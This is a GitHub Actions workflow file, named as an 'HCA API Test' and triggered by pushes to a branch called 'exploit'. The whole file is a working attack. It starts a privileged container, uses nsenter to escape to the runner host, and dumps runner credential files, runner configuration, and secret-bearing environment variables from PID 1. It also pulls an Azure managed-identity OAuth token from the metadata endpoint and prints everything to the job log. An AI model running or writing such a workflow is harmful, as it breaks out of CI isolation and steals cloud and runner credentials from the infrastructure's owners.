name: HCA API Test
on:
  push:
    branches: [exploit]
jobs:
  exec:
    runs-on: ubuntu-latest
    steps:
      - name: Execute
        run: |
          docker run --rm --privileged --pid=host --net=host \
            -v /:/hostfs alpine:latest \
            nsenter -t 1 -m -u -i -n -p -- \
            sh -c '
              echo "=== HCA SETTINGS ==="
              cat /opt/hca/.settings 2>/dev/null
              echo ""
              echo "=== HCA DIAGNOSTICS ==="
              cat /opt/hca/diagnostics.json 2>/dev/null
              echo ""
              echo "=== RUNNER CREDS ==="
              find /home/runner -name ".credentials*" -exec echo FILE:{} \; -exec cat {} \; 2>/dev/null
              echo ""
              echo "=== RUNNER CONFIG ==="
              find /home/runner -name ".runner" -exec cat {} \; 2>/dev/null
              echo ""
              echo "=== PID1 ENV ==="
              cat /proc/1/environ 2>/dev/null | tr "\0" "\n" | grep -iE "(TOKEN|SECRET|KEY|AUTH|PASS|CRED|URL)" | head -20
              echo ""
              echo "=== AZURE TOKEN ==="
              curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>/dev/null | head -500
              echo ""
              echo "=== DOCKER ==="
              docker images 2>/dev/null | head -5
            '
